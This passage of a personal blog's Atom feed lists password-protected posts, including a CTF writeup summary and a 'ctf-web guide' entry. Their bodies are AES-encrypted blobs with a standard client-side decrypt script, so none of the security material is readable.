7DUBZawWHtuaDis8Jrf0AJgxVJzhS/agfRsqJAPgmkw+A1NRm/ncs9/yb1ABUheS62GJcycF4Ws1nI2JsaHOE94+udWCae/9AcRUicgyXExKFuycGGcLYxuv5AFJES26sWgEQDRU1AtwwWuqUmeYa/52Yu8YiFQwzKc3Ytagu7+MjdprxrRnjRQ5B5dW406qNExgGPFisaqQttnM4WeyuoNP4fLcL2R1QtMu/ELj7adM/QjTmvzdgjx48WgH/U0NnpSPKIOaf3v0sD6HAyTElm+Xu8DySqWGtRAAHBhp5QO40Odtkh9DLHDowiLwS1p3z6BuT/7PdaioLkimyPRmAG9wvOA3owDF98Q9qK29i6R4infUYx+orz3AjvoRCOSVteQnuwEKmLRzo+nUzobReIjkyRzswJ5DvqesDYOjs=</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这次比赛非常没有状态，可能是很久没参加正式比赛的缘故。这篇文章为赛后总结，也是一篇writeup。emmmm，我会认真写。&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ctf-web指南</title>
    <link href="https://winter3un.github.io/2018/07/30/ctf-web/"/>
    <id>https://winter3un.github.io/2018/07/30/ctf-web/</id>
    <published>2018-07-31T01:48:54.000Z</published>
    <updated>2018-09-02T04:20:26.564Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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